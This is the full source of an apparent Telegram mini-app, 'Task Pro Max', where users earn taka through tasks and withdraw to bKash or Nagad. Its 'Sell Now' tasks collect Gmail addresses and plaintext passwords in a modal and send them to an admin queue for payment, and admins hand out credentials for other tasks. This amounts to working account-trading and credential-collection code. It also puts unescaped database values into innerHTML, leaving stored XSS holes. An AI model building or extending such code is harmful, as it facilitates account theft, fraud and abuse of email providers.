<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Task Pro Max</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap');
        
        :root { --primary: #4e54c8; --secondary: #8f94fb; --bg: #f4f7f6; --text: #2d3436; --card: #ffffff; }
        body { font-family: 'Outfit', sans-serif; background: var(--bg); color: var(--text); margin: 0; padding-bottom: 90px; -webkit-tap-highlight-color: transparent; }

        /* MODAL (New for Gmail Input) */
        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 2000; align-items: center; justify-content: center; }
        .modal-box { background: white; padding: 25px; border-radius: 15px; width: 85%; max-width: 350px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); text-align: center; }
        .modal-input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
        
        #ban-screen { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background: #fff; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; text-align: center; }

        /* HEADER */
        .header-bg { background: linear-gradient(135deg, var(--primary), var(--secondary)); padding: 30px 20px 80px; border-radius: 0 0 30px 30px; color: white; position: relative; box-shadow: 0 10px 30px rgba(78, 84, 200, 0.2); }
        .user-avatar { width: 55px; height: 55px; background: rgba(255,255,255,0.25); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; border: 2px solid rgba(255,255,255,0.6); margin-right: 15px; }
        
        /* STATS */
        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 0 20px; margin-top: -60px; position: relative; z-index: 20; }
        .stat-card { background: var(--card); padding: 15px; border-radius: 16px; box-shadow: 0 8px 20px rgba(0,0,0,0.06); text-align: center; }
        .stat-val { font-size: 18px; font-weight: 800; color: var(--primary); display: block; }
        .stat-label { font-size: 11px; color: #636e72; font-weight: 500; text-transform: uppercase; }

        /* UI */
        .section-title { padding: 0 20px; margin-top: 25px; margin-bottom: 10px; font-weight: 700; color: #2d3436; font-size: 15px; display: flex; align-items: center; }
        .task-card { background: var(--card); margin: 0 20px 12px; padding: 16px; border-radius: 16px; box-shadow: 0 4px 15px rgba(0,0,0,0.03); display: flex; justify-content: space-between; align-items: center; border: 1px solid #f1f2f6; position: relative; overflow: hidden; }
        .task-card::before { content: ''; position: absolute; left: 0; top: 0; bottom: 0; width: 4px; background: var(--primary); }
        .btn-start { background: linear-gradient(135deg, var(--primary), var(--secondary)); color: white; border: none; padding: 8px 18px; border-radius: 25px; font-weight: 600; font-size: 11px; cursor: pointer; }

        .msg-card { background: white; margin: 0 20px 10px; padding: 12px; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.03); border: 1px solid #eee; }
        .status-badge { padding: 3px 8px; border-radius: 6px; font-size: 10px; font-weight: bold; }
        .btn-cancel { background: #ff7675; color: white; padding: 8px; width: 48%; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 11px; }
        .btn-submit { background: #00b894; color: white; padding: 8px; width: 48%; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 11px; }

        .nav-bar { position: fixed; bottom: 15px; left: 15px; right: 15px; background: rgba(255,255,255,0.95); backdrop-filter: blur(10px); border-radius: 20px; padding: 12px 20px; display: flex; justify-content: space-between; box-shadow: 0 10px 40px rgba(0,0,0,0.1); z-index: 100; }
        .nav-item { text-align: center; color: #b2bec3; font-size: 10px; cursor: pointer; transition: 0.3s; }
        .nav-item.active { color: var(--primary); transform: translateY(-3px); }

        .page { display: none; animation: fadeIn 0.4s ease; } .page.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        
        input, select { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #eee; border-radius: 12px; background: #f9f9f9; box-sizing: border-box; font-family: inherit; }
        .marquee-container { margin: 15px 20px; background: #fff8e1; color: #f39c12; padding: 8px 12px; border-radius: 10px; font-size: 12px; display: flex; align-items: center; }
        .banner-box { margin: 0 20px; border-radius: 12px; overflow: hidden; display: none; }
        .banner-box img { width: 100%; display: block; }
    </style>
</head>
<body>

    <!-- Ban Screen -->
    <div id="ban-screen">
        <i class="fas fa-user-lock" style="font-size: 60px; color: #ff6b6b; margin-bottom: 20px;"></i>
        <h2>Restricted</h2><p>Contact Support</p>
    </div>

    <!-- SUBMIT MODAL (New Feature) -->
    <div id="submit-modal" class="modal-overlay">
        <div class="modal-box">
            <h3 style="margin-top:0;">📧 Submit Data</h3>
            <p style="font-size:12px; color:#666;">Provide the Gmail credentials.</p>
            <input type="email" id="sub-email" class="modal-input" placeholder="Gmail Address (e.g. user@gmail.com)">
            <input type="text" id="sub-pass" class="modal-input" placeholder="Gmail Password">
            <div style="display:flex; gap:10px; margin-top:10px;">
                <button onclick="closeModal()" style="flex:1; padding:10px; border:none; border-radius:8px; cursor:pointer;">Cancel</button>
                <button onclick="confirmSubmitData()" style="flex:1; padding:10px; border:none; border-radius:8px; background:var(--primary); color:white; cursor:pointer;">Submit</button>
            </div>
        </div>
    </div>

    <!-- HEADER -->
    <div class="header-bg">
        <div style="display:flex; align-items:center;">
            <div class="user-avatar"><i class="fas fa-user-astronaut"></i></div>
            <div>
                <h2 style="margin:0; font-size:20px;" id="u_name">Loading...</h2>
                <p style="margin:0; font-size:12px; opacity:0.8;">ID: <span id="u_id">---</span></p>
            </div>
        </div>
    </div>

    <!-- STATS -->
    <div class="stats-grid">
        <div class="stat-card"><span class="stat-val">৳<span id="bal_main">0</span></span><span class="stat-label">Balance</span></div>
        <div class="stat-card"><span class="stat-val">৳<span id="bal_today">0</span></span><span class="stat-label">Today</span></div>
        <div class="stat-card"><span class="stat-val" id="task_today">0</span><span class="stat-label">Tasks</span></div>
        <div class="stat-card"><span class="stat-val">৳<span id="wd_total">0</span></span><span class="stat-label">Withdrawn</span></div>
    </div>

    <div id="notice-area" class="marquee-container" style="display:none;">
        <i class="fas fa-volume-up" style="margin-right:10px;"></i>
        <marquee id="notice-text">Welcome!</marquee>
    </div>
    <div id="banner-area" class="banner-box"><img id="banner-img" src=""></div>

    <!-- HOME -->
    <div id="p-home" class="page active">
        <div class="section-title"><i class="fas fa-fire"></i> Available Tasks</div>
        <div id="task-list"><div style="text-align:center; padding:30px; color:#b2bec3;">Loading...</div></div>
    </div>

    <!-- LEADERBOARD -->
    <div id="p-leader" class="page">
        <div class="section-title"><i class="fas fa-trophy"></i> Top Leaders</div>
        <div id="leaderboard-list"></div>
    </div>

    <!-- INBOX -->
    <div id="p-inbox" class="page">
        <div class="section-title"><i class="fas fa-history"></i> History & Inbox</div>
        <div id="inbox-list"></div>
    </div>

    <!-- WALLET -->
    <div id="p-profile" class="page">
        <div class="section-title"><i class="fas fa-wallet"></i> Withdraw</div>
        <div style="background: white; margin: 0 20px; padding: 20px; border-radius: 16px;">
            <p style="font-size:12px; color:#e67e22; background:#fff3cd; padding:10px; border-radius:8px;">Min Withdraw: <b id="min-wd-txt">100</b> Tk</p>
            <select id="wd_method">
                <option value="Bkash">bKash (বিকাশ)</option>
                <option value="Nagad">Nagad (নগদ)</option>
                <option value="Rocket">Rocket (রকেট)</option>
                <option value="Upay">Upay (উপায়)</option>
            </select>
            <input type="number" id="wd_number" placeholder="017xxxxxxxx">
            <input type="number" id="wd_amount" placeholder="Amount">
            <button onclick="reqWd()" style="width:100%; background:var(--primary); color:white; padding:15px; border:none; border-radius:12px; font-weight:bold;">Confirm Withdraw</button>
        </div>
    </div>

    <div class="nav-bar">
        <div class="nav-item active" onclick="nav('p-home', this)"><i class="fas fa-home"></i>Home</div>
        <div class="nav-item" onclick="nav('p-leader', this)"><i class="fas fa-chart-line"></i>Top</div>
        <div class="nav-item" onclick="nav('p-inbox', this)"><i class="fas fa-bell"></i>Inbox</div>
        <div class="nav-item" onclick="nav('p-profile', this)"><i class="fas fa-wallet"></i>Wallet</div>
    </div>

    <script>
        // FIREBASE CONFIG
        const firebaseConfig = {
            apiKey: "AIzaSyC3uf_5gEMK_JjsmFW01ofRE-ESaXhio9I",
            authDomain: "taskbot-b6fe2.firebaseapp.com",
            databaseURL: "https://taskbot-b6fe2-default-rtdb.firebaseio.com",
            projectId: "taskbot-b6fe2",
            storageBucket: "taskbot-b6fe2.firebasestorage.app",
            messagingSenderId: "187560047900",
            appId: "1:187560047900:web:f458a4f99e2e7d967f36d9",
            measurementId: "G-9GPFKEQJ53"
        };
        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const tg = window.Telegram.WebApp;
        try { tg.expand(); } catch(e){}
        let user = tg.initDataUnsafe.user || { id: 112233, first_name: "TestUser" };

        document.getElementById('u_name').innerText = user.first_name;
        document.getElementById('u_id').innerText = user.id;

        let minWithdraw = 100;
        let activeTaskData = null; // Temp storage for modal

        function initApp() {
            const userRef = db.ref('users/' + user.id);
            userRef.once('value', s => {
                if(!s.exists()) userRef.set({ name: user.first_name, balance: 0, total_withdraw: 0, banned: false });
            });

            userRef.on('value', snap => {
                const u = snap.val(); if(!u) return;
                if(u.banned) document.getElementById('ban-screen').style.display = 'flex';
                
                const todayStr = new Date().toDateString();
                if(u.last_active !== todayStr) userRef.update({ last_active: todayStr, today_income: 0, today_tasks: 0 });

                document.getElementById('bal_main').innerText = (u.balance || 0).toFixed(2);
                document.getElementById('bal_today').innerText = (u.today_income || 0).toFixed(2);
                document.getElementById('task_today').innerText = (u.today_tasks || 0);
                document.getElementById('wd_total').innerText = (u.total_withdraw || 0).toFixed(2);
            });

            db.ref('app_settings').on('value', snap => {
                const s = snap.val();
                if(s) {
                    if(s.notice) { document.getElementById('notice-area').style.display = 'flex'; document.getElementById('notice-text').innerText = s.notice; }
                    if(s.banner) { document.getElementById('banner-area').style.display = 'block'; document.getElementById('banner-img').src = s.banner; }
                    if(s.min_withdraw) { minWithdraw = parseInt(s.min_withdraw); document.getElementById('min-wd-txt').innerText = minWithdraw; }
                }
            });

            loadTasks();
            loadLeaderboard();
            loadInbox();
        }

        function loadTasks() {
            db.ref('tasks').on('value', snap => {
                const list = document.getElementById('task-list');
                list.innerHTML = '';
                if(!snap.val()) { list.innerHTML = '<div style="text-align:center;color:#aaa;padding:20px;">No Tasks</div>'; return; }
                const tasks = snap.val();
                Object.keys(tasks).forEach(k => {
                    const t = tasks[k];
                    const btnText = t.type === 'submit' ? 'Sell Now' : 'Start Task';
                    list.innerHTML += `
                    <div class="task-card">
                        <div>
                            <div style="font-weight:700; font-size:14px;">${t.title}</div>
                            <div style="font-size:11px; color:#95a5a6;">${t.desc}</div>
                            <span style="font-size:10px; background:#eee; padding:2px 5px; border-radius:4px;">${t.type==='submit'?'You Give Data':'Admin Gives Data'}</span>
                        </div>
                        <div style="text-align:right;">
                            <div style="color:var(--primary); font-weight:800; font-size:15px; margin-bottom:5px;">৳${t.price}</div>
                            <button class="btn-start" onclick="initTask('${k}', '${t.title}', ${t.price}, '${t.type}')">${btnText}</button>
                        </div>
                    </div>`;
                });
            });
        }

        function initTask(id, title, price, type) {
            // BUYING TASK (Show Modal)
            if(type === 'submit') {
                activeTaskData = { title, price }; // Store for modal
                document.getElementById('submit-modal').style.display = 'flex';
                document.getElementById('sub-email').value = '';
                document.getElementById('sub-pass').value = '';
            } 
            // NORMAL TASK
            else {
                if(confirm(`Request to start ${title}?`)) {
                    const reqId = Date.now();
                    const data = { 
                        reqId, userId: user.id, userName: user.first_name, 
                        type: 'Task', taskName: title, price: price, 
                        status: 'Pending', 
                        taskType: 'normal',
                        timestamp: new Date().toLocaleString() 
                    };
                    db.ref('admin_requests/'+reqId).set(data);
                    db.ref('users/'+user.id+'/inbox/'+reqId).set(data);
                    alert("Request Sent! Wait for Admin credentials.");
                }
            }
        }

        function closeModal() {
            document.getElementById('submit-modal').style.display = 'none';
        }

        function confirmSubmitData() {
            const email = document.getElementById('sub-email').value;
            const pass = document.getElementById('sub-pass').value;
            
            if(!email || !pass) return alert("Please fill both Email and Password");

            const reqId = Date.now();
            const data = { 
                reqId, userId: user.id, userName: user.first_name, 
                type: 'Task', taskName: activeTaskData.title, price: activeTaskData.price, 
                status: 'Reviewing', 
                replyData: `Email: ${email} | Pass: ${pass}`, // Combined for Admin
                taskType: 'submit',
                timestamp: new Date().toLocaleString() 
            };
            db.ref('admin_requests/'+reqId).set(data);
            db.ref('users/'+user.id+'/inbox/'+reqId).set(data);
            
            closeModal();
            alert("Submitted Successfully! Admin will check and pay.");
        }

        function submitDone(reqId) {
            if(confirm("Completed?")) {
                db.ref('admin_requests/'+reqId).update({status: 'Reviewing'});
                db.ref('users/'+user.id+'/inbox/'+reqId).update({status: 'Reviewing'});
            }
        }

        function cancelTask(reqId) {
            if(confirm("Cancel this task?")) {
                db.ref('admin_requests/'+reqId).update({status: 'Cancelled'});
                db.ref('users/'+user.id+'/inbox/'+reqId).update({status: 'Cancelled'});
            }
        }

        function loadLeaderboard() {
            db.ref('users').on('value', snap => {
                const list = document.getElementById('leaderboard-list');
                list.innerHTML = '';
                let arr = [];
                snap.forEach(c => arr.push(c.val()));
                arr.sort((a, b) => (b.balance || 0) - (a.balance || 0)); 

                arr.slice(0, 10).forEach((u, i) => {
                    let r = i===0?'rank-1':(i===1?'rank-2':(i===2?'rank-3':''));
                    list.innerHTML += `
                    <div class="msg-card" style="display:flex; justify-content:space-between;">
                        <span class="${r}">#${i+1} ${u.name}</span>
                        <span style="font-weight:bold; color:var(--primary);">৳${(u.balance||0).toFixed(0)}</span>
                    </div>`;
                });
            });
        }

        function loadInbox() {
            db.ref('users/' + user.id + '/inbox').limitToLast(50).on('value', snap => {
                const list = document.getElementById('inbox-list');
                list.innerHTML = '';
                if(!snap.val()) { list.innerHTML = '<p style="text-align:center;color:#aaa">No History</p>'; return; }
                const msgs = Object.values(snap.val()).reverse();
                
                msgs.forEach(m => {
                    if(m.type === 'Notification') {
                        list.innerHTML += `<div class="msg-card" style="border-left:4px solid var(--secondary);"><div style="font-size:10px;">📢 Notice • ${m.timestamp}</div><div style="font-size:13px; margin-top:5px;">${m.message}</div></div>`;
                        return;
                    }

                    let statusColor = '#e67e22';
                    let actionArea = '';

                    if (m.type === 'Task') {
                        if (m.status === 'InProgress') { 
                            statusColor = '#3498db';
                            actionArea = `
                                <div style="margin-top:10px; border-top:1px dashed #eee; padding-top:10px;">
                                    <div style="background:#2d3436; color:#00cec9; padding:10px; border-radius:8px; font-family:monospace;">${m.replyData}</div>
                                    <div style="display:flex; gap:10px; margin-top:10px;">
                                        <button class="btn-submit" onclick="submitDone('${m.reqId}')">✅ Done</button>
                                        <button class="btn-cancel" onclick="cancelTask('${m.reqId}')">❌ Cancel</button>
                                    </div>
                                </div>`;
                        } 
                        else if (m.status === 'Reviewing') {
                            statusColor = '#9b59b6';
                            actionArea = `<span class="submitted-badge">⏳ Under Review (${m.taskType==='submit'?'Checking Data':'Checking Task'})</span>`;
                        } 
                        else if (m.status === 'Completed') {
                            statusColor = '#00b894';
                            actionArea = `<span class="submitted-badge" style="background:#e0f2f1; color:#00695c;">💰 Paid & Completed</span>`;
                        } 
                        else if (m.status === 'Rejected' || m.status === 'Cancelled') {
                            statusColor = '#ff7675';
                            actionArea = `<span class="submitted-badge" style="background:#ffebee; color:#c62828;">❌ ${m.status}</span>`;
                        }
                    } else if (m.type === 'Withdraw') {
                        if(m.status === 'Paid') statusColor = '#00b894';
                        if(m.status === 'Rejected') statusColor = '#ff7675';
                    }

                    let details = m.type === 'Withdraw' ? `Cashout (${m.method})` : m.taskName;

                    list.innerHTML += `
                    <div class="msg-card" style="border-left:4px solid ${statusColor};">
                        <div style="display:flex; justify-content:space-between; font-size:10px; color:#b2bec3;">
                            <span>${m.timestamp}</span>
                            <span style="font-weight:bold; color:${statusColor}">${m.status}</span>
                        </div>
                        <div style="font-weight:700; font-size:14px; margin-top:4px;">${m.type}: ${details}</div>
                        <div style="font-size:12px;">Amount: ৳${m.price || m.amount}</div>
                        ${actionArea}
                    </div>`;
                });
            });
        }

        function reqWd() {
            const method = document.getElementById('wd_method').value;
            const number = document.getElementById('wd_number').value;
            const amount = parseFloat(document.getElementById('wd_amount').value);
            db.ref('users/' + user.id + '/balance').once('value', snap => {
                if((snap.val()||0) < amount) return alert("Insufficient Balance");
                if(!number || number.length < 10) return alert("Invalid Number");
                if(amount < minWithdraw) return alert(`Min Withdraw ${minWithdraw} Tk`);
                const reqId = Date.now();
                const data = { reqId, userId: user.id, userName: user.first_name, type: 'Withdraw', method, number, amount, status: 'Pending', timestamp: new Date().toLocaleString() };
                db.ref('admin_requests/' + reqId).set(data);
                db.ref('users/' + user.id + '/inbox/' + reqId).set(data);
                alert("Sent!");
            });
        }

        function nav(page, el) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(page).classList.add('active');
            document.querySelectorAll('.nav-item').forEach(b => b.classList.remove('active'));
            el.classList.add('active');
        }

        initApp();
    </script>
</body>
</html>
